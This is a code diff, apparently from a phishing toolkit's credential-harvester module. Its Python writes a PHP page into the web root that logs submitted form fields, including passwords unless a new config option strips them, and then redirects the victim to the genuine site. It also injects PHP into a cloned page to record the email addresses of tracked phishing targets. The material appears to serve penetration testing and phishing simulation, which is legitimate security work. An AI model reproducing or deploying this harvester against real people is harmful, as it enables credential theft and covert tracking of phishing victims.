@@ -510,8 +510,16 @@ def run():
         filewrite = open("%s/post.php" % (apache_dir), "w")
         now = str(datetime.datetime.today())
         harvester_file = ("harvester_" + now + ".txt")
-        filewrite.write(
-            """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
+        log_password = check_config("HARVESTER_LOG_PASSWORDS=")
+        harvester_redirect = check_config("HARVESTER_REDIRECT=")
+        if harvester_redirect.lower() == "on":
+            RAW_URL = check_config("HARVESTER_URL=")
+        if log_password.lower() == "on":
+            filewrite.write(
+                """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
+        else:
+            filewrite.write(
+                """<?php $file = '%s';$patt = '/password/';$store = $_POST;foreach($store as $key => $value){if(preg_match($patt,$key)){unset($store[$key]);}};file_put_contents($file, print_r($store, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
         filewrite.close()
         if os.path.isdir("/var/www/html"):
             logpath = ("/var/www/html")
@@ -541,8 +549,8 @@ def run():
         if track_email == True:
             fileopen = open(setdir + "/web_clone/index.html", "r")
             data = fileopen.read()
-            data = data.replace(
-                "<body>", """<body><?php $file = '%s'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (harvester_file))
+            data = re.sub(
+                "<body[\s\S]+?>", """<body><?php $file = '%s'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (harvester_file), data)
             filewrite = open(setdir + "/web_clone/index.2", "w")
             filewrite.write(data)
             filewrite.close()
